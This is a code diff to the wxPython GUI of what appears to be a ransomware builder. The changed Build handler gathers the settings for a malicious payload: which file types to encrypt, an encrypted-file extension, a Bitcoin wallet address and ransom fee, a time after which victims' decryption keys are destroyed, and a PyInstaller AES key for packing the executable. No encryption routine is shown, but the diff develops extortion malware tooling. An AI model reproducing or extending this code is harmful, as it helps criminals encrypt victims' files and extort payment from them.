@@ -111,7 +111,7 @@ class Gui(MainFrame):
         self.Bind(wx.EVT_CHOICE, self.update_language, self.BuilderLanguageChoice)
 
         # BUILD button
-        self.Bind(wx.EVT_BUTTON, self.validate, self.BuildButton)
+        self.Bind(wx.EVT_BUTTON, self.__validate, self.BuildButton)
         
         
     def update_language(self, event, language=None):
@@ -124,17 +124,47 @@ class Gui(MainFrame):
         if not event:
             if language == "English":
                 self.language = "English"
-                print("Changing language to English")
-            elif unicode(language) == u"Русский":
-                self.language = "Русский"
-                print("Changing language to Russian")
+                #print("Changing language to English")
             
 
         
-    def validate(self, event):
+    def __validate(self, event):
         '''
         @summary: Validates the Build configuration input
         '''
+        config_dict = {}
         
-        # Read the form contents and validate
-        self.validate("Test")
+        # Read the form contents and pass to Builder validate
+        # Major Version
+        config_dict["maj_version"] = self.MajorVersionTextCtrl.GetValue()
+        # Minor Version
+        config_dict["min_version"] = self.MinorVersionTextCtrl.GetValue()
+        # Filename
+        config_dict["filename"] = self.FilenameTextCtrl.GetValue()
+        # Filename
+        config_dict["extension"] = self.ExtensionTextCtrl.GetValue()
+        # PyInstaller AES Key
+        config_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
+        # PyInstaller AES Key
+        config_dict["icon_file"] = self.IconFilePicker.GetPath()
+        # Encrypted File Extension
+        config_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
+        # Wallet Address
+        config_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
+        # Bitcoin Fee
+        config_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
+        # Key Destruction Time
+        config_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
+        # Max file size to encrypt
+        config_dict["max_file_size_to_encrypt"] = self.MaxFileSizeTextCtrl.GetValue()
+        # Max file size to encrypt
+        config_dict["filetypes_to_encrypt"] = self.FiletypesToEncryptTextCtrl.GetValue()
+
+        # Call validator
+        self.validate(config_dict)
+    
+    
+    
+    
+    
+    
